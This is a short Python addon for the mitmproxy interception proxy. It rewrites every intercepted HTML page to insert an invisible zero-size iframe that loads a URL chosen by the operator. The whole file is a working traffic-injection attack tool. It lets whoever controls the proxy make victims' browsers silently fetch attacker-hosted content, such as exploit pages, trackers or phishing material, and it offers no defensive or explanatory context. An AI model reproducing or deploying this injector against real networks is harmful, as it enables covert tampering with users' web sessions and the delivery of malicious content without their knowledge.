#!/usr/bin/env python3
import sys
import logging
import argparse

from mitmproxy import http

# Usage: mitmdump -s "iframe_injector.py url"
# (this script works best with --anticache)
from bs4 import BeautifulSoup


class Injector(object):
    def __init__(self, iframe_url):
        self.iframe_url = iframe_url

    def response(self, flow):
        if flow.request.host in self.iframe_url:
            return
        html = BeautifulSoup(flow.response.content, "html.parser")
        logging.debug("Beautiful soup called correctly")
        if html.body:
            iframe = html.new_tag(
                "iframe",
                src=self.iframe_url,
                frameborder=0,
                height=0,
                width=0)
            html.body.insert(0, iframe)
            flow.response.content = str(html).encode("utf8")
            logging.debug("Body enhanced.")

def get_parser():
    parser = argparse.ArgumentParser(__name__)
    parser.add_argument('-s', '--source')
    parser.add_argument('-d', '--debug', help='Enable debug logging.', action='store_true')
    return parser

def start():
    parser = get_parser()
    args = parser.parse_args()
    if args.debug:
        logging.basicConfig(level=logging.DEBUG)
    return Injector(args.source)

if __name__ == '__main__':
    start()
